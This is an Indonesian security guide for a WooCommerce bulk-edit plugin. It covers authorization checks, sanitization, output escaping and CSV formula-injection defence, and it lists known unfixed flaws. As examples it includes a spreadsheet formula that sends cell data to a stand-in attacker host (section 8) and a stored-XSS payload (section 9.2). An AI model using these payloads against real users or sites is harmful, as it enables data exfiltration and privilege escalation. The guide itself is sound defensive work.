# Keamanan

Plugin ini memberi satu HTTP request kemampuan mengubah ratusan produk
sekaligus. Bug otorisasi di sini bukan sekadar kebocoran data — bisa berarti
seluruh katalog toko diubah harganya atau dihapus dalam satu panggilan.

Dokumen ini adalah aturan kerja, bukan teori. Semua contoh diambil dari kode
plugin ini sendiri.

---

## 1. Setiap Handler AJAX Dimulai dengan `guard()`

```php
private function guard(): void
{
    check_ajax_referer(self::NONCE, 'nonce');   // nonce → mati kalau gagal

    if (!current_user_can(self::CAPABILITY)) {  // manage_woocommerce
        wp_send_json_error(['message' => …], 403);
    }
}
```

❌ **Salah** — cek nonce saja:
```php
public function wc_bulk_something(): void
{
    check_ajax_referer(self::NONCE, 'nonce');
    // Nonce hanya membuktikan "request datang dari halaman kita".
    // Subscriber yang login juga punya nonce yang valid.
    $this->do_something();
}
```

✅ **Benar**:
```php
public function wc_bulk_something(): void
{
    $this->guard();
    $this->do_something();
}
```

**Nonce bukan otorisasi.** Nonce menjawab "apakah request ini berasal dari
form kita?", bukan "apakah user ini boleh?". Keduanya harus dicek. Itu sebabnya
`guard()` melakukan dua-duanya dan tidak boleh dipecah.

Handler baru wajib memanggil `guard()` **di baris pertama** — sebelum membaca
`$_POST`, sebelum query apa pun.

---

## 2. `manage_woocommerce` Tidak Selalu Cukup

Capability itu dimiliki **Shop Manager**, bukan hanya Administrator. Untuk aksi
yang lebih berbahaya, tambahkan cek di atas `guard()`:

| Aksi | Cek tambahan | Di mana |
|---|---|---|
| Buat kategori | `manage_product_terms` | `wc_bulk_create_category()` |
| Trash / hapus produk | `current_user_can('delete_post', $id)` | `wc_bulk_bulk_action()` |

Perhatikan pola pada penghapusan:

✅ **Benar** — dicek per produk, di dalam loop:
```php
foreach ($ids as $id) {
    $done = match ($action) {
        'trash'  => current_user_can('delete_post', $id) && (bool) wp_trash_post($id),
        'delete' => current_user_can('delete_post', $id) && (bool) wp_delete_post($id, true),
    };
}
```

❌ **Salah** — dicek sekali di awal:
```php
if (!current_user_can('delete_posts')) { … }   // capability umum
foreach ($ids as $id) { wp_delete_post($id, true); }
```

Capability per-objek (`delete_post`, `edit_post`) menghormati kepemilikan post
dan filter dari plugin lain. Capability umum (`delete_posts`) tidak. Kalau ada
plugin yang membatasi vendor hanya boleh menghapus produknya sendiri, hanya
versi per-objek yang menghormatinya.

> **Catatan:** `wc_bulk_bulk_action()` melewatkan cek per-objek untuk
> `duplicate`. Menggandakan produk membuat objek baru dan tidak merusak yang
> lama, jadi risikonya rendah — tapi kalau nanti duplicate diberi kemampuan
> menyalin ke status publish, tambahkan `current_user_can('edit_post', $id)`.

---

## 3. Input: Jangan Sentuh `$_POST` Langsung

Sudah tersedia dua helper. Pakai itu.

```php
$this->post_string('search');    // wp_unslash → sanitize_text_field → string
$this->post_ids('product_ids');  // absint tiap elemen, buang yang 0
```

❌ **Salah**:
```php
$name = $_POST['name'];
$ids  = $_POST['product_ids'];
```

✅ **Benar**:
```php
$name = $this->post_string('name');
$ids  = $this->post_ids('product_ids');
```

Kalau butuh angka tunggal, `absint()` langsung dapat diterima — pola ini sudah
dipakai di beberapa tempat:
```php
$page   = max(1, absint($_POST['page'] ?? 1));
$parent = absint($_POST['parent'] ?? 0);
```

**Selalu sertakan `?? default`.** Tanpa itu, request tanpa field tersebut
memicu PHP warning, dan warning yang bocor ke output akan merusak respons JSON.

### Slash WordPress

WordPress menambahkan slash ke seluruh `$_POST` (peninggalan magic quotes).
Nilai yang tidak di-`wp_unslash()` akan menyimpan `\'` alih-alih `'`.
`post_string()` sudah menanganinya; kalau membaca `$_POST` langsung untuk teks,
kamu harus melakukannya sendiri:

```php
$changes = (array) wp_unslash($_POST['changes'] ?? []);
```

---

## 4. Whitelist, Bukan Blacklist

Semua field yang punya himpunan nilai terbatas divalidasi terhadap daftar nilai
sah — bukan disaring dari nilai buruk.

```php
private function set_enum(WC_Product $product, string $field, mixed $value): void
{
    [$setter, $allowed] = self::ENUM_SETTERS[$field];

    if (in_array($value, $allowed, true)) {   // strict comparison
        $product->{$setter}($value);
    }
    // Nilai di luar daftar diabaikan diam-diam. Bukan error, bukan tersimpan.
}
```

Pola yang sama dipakai di:

- `set_post_status()` → hanya `POST_STATUSES`
- `set_bool()` → hanya persis `'yes'` atau `'no'`
- `wc_bulk_bulk_action()` → hanya `duplicate`, `trash`, `delete`
- `wc_bulk_save_columns()` → `array_intersect()` dengan `array_keys(COLUMNS)`
- `wc_bulk_quick_add()` → status hanya `publish` atau `draft`, selain itu `draft`

Perhatikan `wc_bulk_save_columns()` — ini contoh bagus:
```php
$requested = array_map('sanitize_text_field', (array) ($_POST['columns'] ?? []));
$columns   = array_values(array_intersect($requested, array_keys(self::COLUMNS)));
```
Nama kolom karangan tidak akan pernah masuk user meta.

**Gunakan `in_array(..., true)`** — parameter ketiga wajib. Tanpa strict mode,
`in_array(0, ['publish', 'draft'])` bernilai `true` di PHP lama karena
type juggling.

---

## 5. Penulisan Produk Selalu Lewat CRUD

❌ **Salah**:
```php
update_post_meta($pid, '_regular_price', $price);
update_post_meta($pid, '_stock', $qty);
```

✅ **Benar**:
```php
$product = wc_get_product($pid);
$product->set_regular_price($price);
$product->save();
wc_delete_product_transients($pid);
```

Alasannya bukan sekadar gaya. `update_post_meta()` langsung:
- melewati validasi WooCommerce (harga negatif bisa masuk),
- melewati hook `woocommerce_product_object_updated_props` yang dipakai plugin
  lain,
- meninggalkan lookup table WooCommerce (`wc_product_meta_lookup`) tidak
  sinkron, sehingga filter harga dan sorting di frontend jadi salah,
- meninggalkan transient produk basi.

Untuk **order** (kalau nanti dipakai): HPOS aktif di plugin ini. `get_post_meta()`
pada order akan mengembalikan data kosong atau basi. Gunakan `wc_get_order()`
dan `$order->get_meta()` saja.

---

## 6. Sanitasi Sesuai Konteks

Tiap tipe field disanitasi dengan fungsi yang tepat, bukan `sanitize_text_field()`
untuk semuanya:

```php
match ($field) {
    'regular_price', 'sale_price'      => $value === '' ? '' : (string) max(0, (float) $value),
    'stock_quantity', 'menu_order'     => $value === '' ? null : max(0, (int) $value),
    'description', 'short_description' => wp_kses_post($value),        // HTML terbatas
    'purchase_note'                    => sanitize_textarea_field($value), // newline dipertahankan
    default                            => $value === '' ? '' : sanitize_text_field($value),
};
```

Panduan singkat:

| Isi field | Fungsi |
|---|---|
| Teks satu baris | `sanitize_text_field()` |
| Teks multi-baris | `sanitize_textarea_field()` |
| HTML konten (deskripsi) | `wp_kses_post()` |
| Angka | `absint()` / `(float)` + `max(0, …)` |
| Email | `sanitize_email()` |
| URL | `esc_url_raw()` (saat menyimpan), `esc_url()` (saat mencetak) |
| Slug / key | `sanitize_key()` / `sanitize_title()` |

`wp_kses_post()` **bukan** pemblokir HTML — ia mengizinkan tag yang boleh ada
di post. Itu memang yang diinginkan untuk deskripsi produk. Jangan pakai untuk
field yang seharusnya polos.

---

## 7. Output: Escape di Titik Cetak

### PHP (`views/admin-page.php`)

```php
<?php esc_html_e('Bulk Product Editor', 'wc-bulk-editor'); ?>
<span>v<?php echo esc_html(WCBULK_VERSION); ?></span>
placeholder="<?php esc_attr_e('Name or SKU...', 'wc-bulk-editor'); ?>"
```

Aturannya: **escape saat mencetak, bukan saat menyimpan.** Fungsi dipilih
menurut posisi dalam HTML — `esc_html()` untuk isi elemen, `esc_attr()` untuk
nilai atribut, `esc_url()` untuk href/src.

### JavaScript

Seluruh tabel dirender dengan string concatenation ke `innerHTML`. Karena itu
setiap nilai dari server **wajib** melewati helper escape:

```js
esc(t)      // untuk isi elemen — pakai createTextNode, aman
escAttr(t)  // untuk nilai atribut — escape & " < >
```

❌ **Salah**:
```js
'<td>' + p.name + '</td>'
'value="' + cv + '"'
```

✅ **Benar**:
```js
'<td>' + s.esc(p.name) + '</td>'
'value="' + s.escAttr(cv) + '" '
```

Nama produk, SKU, nama kategori, dan URL semuanya berasal dari database dan
bisa berisi `<`, `"`, atau `&`. Data yang aman di database tidak otomatis aman
di HTML.

---

## 8. Formula Injection pada CSV

Sudah ditangani, dan jangan sampai hilang saat refactor:

```php
private function csv_cell(string $value): string
{
    if (preg_match('/^[=+\-@]/', $value) === 1) {
        $value = '\'' . $value;   // prefix kutip → Excel memperlakukannya sebagai teks
    }

    return '"' . str_replace('"', '""', $value) . '"';
}
```

Tanpa ini, nama produk seperti `=HYPERLINK("http://evil.test?d="&A1,"Klik")`
akan dieksekusi saat file CSV dibuka di Excel atau Google Sheets — mengirim isi
sel lain ke server penyerang. Ini kerentanan pada *pembuka file*, bukan pada
WordPress, dan sering terlewat.

**Setiap sel CSV baru harus melewati `csv_cell()`.** Jangan menulis nilai
langsung ke baris.

---

## 9. Yang Perlu Diperbaiki

Temuan dari pembacaan kode. Belum diperbaiki, dicatat agar tidak terlupa.

### 9.1 File backup dapat diakses publik — **prioritas tertinggi**

Ada sekitar 40 file berpola `*.bak-before-*` dan folder `assets/_css-backup/`
di dalam plugin ini. Karena tidak berekstensi `.php`, Apache dan Nginx
menyajikannya sebagai **teks biasa**:

```
http://situs.test/wp-content/plugins/wc-bulk-editor/wc-bulk-editor.php.bak-before-refactor
```

Siapa pun tanpa login bisa membaca seluruh source code — termasuk nama nonce,
daftar 14 endpoint AJAX, nama meta key, dan logika validasi. Scanner otomatis
memang mencari pola `.bak`, `.old`, `.save`, `~`.

Tindakan: hapus file-file itu, gunakan git sebagai gantinya. Sampai terhapus,
mitigasi sementara di `.htaccess` plugin:

```apache
<FilesMatch "\.(bak|old|save|orig|swp)[^/]*$">
    Require all denied
</FilesMatch>
```

Catatan: `.htaccess` **tidak berlaku di Nginx**. Kalau produksi memakai Nginx,
satu-satunya solusi adalah menghapus file tersebut.

### 9.2 XSS tersimpan pada dropdown tax class & shipping class

Di `admin.js:597-640`, renderer `tax_class` dan `shipping_class` membaca teks
option dari DOM lalu menyambungnya ke HTML **tanpa escape**:

```js
o += '<option value="' + $(this).val() + '">' + $(this).text() + '</option>';
```

`$(this).text()` mengembalikan teks mentah yang sudah ter-decode. Kalau ada tax
class bernama `<img src=x onerror=alert(1)>`, skrip itu akan tereksekusi.

Tingkat keparahan sedang: pembuatan tax class memerlukan `manage_woocommerce`,
jadi penyerang sudah harus punya akses tinggi. Tapi ini tetap jalur eskalasi
dari Shop Manager ke Administrator — Shop Manager membuat tax class berbahaya,
Administrator membuka Bulk Editor, skrip berjalan dengan hak Administrator.

Perbaikan: bungkus keduanya dengan `s.escAttr()` dan `s.esc()`.

### 9.3 Pola `.replace()` untuk menandai option terpilih

Masih di renderer yang sama:

```js
o.replace('value="' + cv + '"', 'value="' + cv + '" selected')
```

`String.replace()` dengan argumen string hanya mengganti **kecocokan pertama**.
Kalau `cv` bernilai `"2"` dan ada option `value="12"` yang muncul lebih dulu,
substring `value="2"` tidak akan cocok — tapi pada kasus lain bisa salah target.
Ini bug korektnes, bukan keamanan, tapi ada di kode yang sama dengan 9.2 jadi
sekalian saja saat memperbaiki.

### 9.4 Header plugin belum lengkap

`wc-bulk-editor.php` belum mencantumkan:
```
Requires at least: 6.5
Requires Plugins: woocommerce
License:          GPL-2.0-or-later
License URI:      https://www.gnu.org/licenses/gpl-2.0.html
```

`Requires Plugins` (WordPress 6.5+) membuat WordPress menolak aktivasi kalau
WooCommerce belum aktif — lebih baik daripada `return` diam-diam di baris 15,
yang membuat plugin tampak aktif padahal tidak melakukan apa pun.

---

## Checklist Sebelum Commit

Untuk setiap handler AJAX baru:

- [ ] `$this->guard()` di baris pertama
- [ ] Cek capability tambahan kalau aksinya destruktif — per objek, di dalam loop
- [ ] Semua input lewat `post_string()` / `post_ids()` / `absint()` dengan default
- [ ] Nilai berhimpunan terbatas divalidasi `in_array(..., true)`
- [ ] Penulisan produk lewat CRUD, bukan `update_post_meta()`
- [ ] Terdaftar di `ajax_actions()`

Untuk setiap perubahan output:

- [ ] PHP: `esc_html()` / `esc_attr()` / `esc_url()` di titik cetak
- [ ] JS: `s.esc()` untuk isi elemen, `s.escAttr()` untuk atribut
- [ ] Sel CSV baru melewati `csv_cell()`

Untuk setiap perubahan apa pun:

- [ ] Tidak ada file `.bak-*` baru
- [ ] Diuji sebagai **Shop Manager**, bukan hanya Administrator
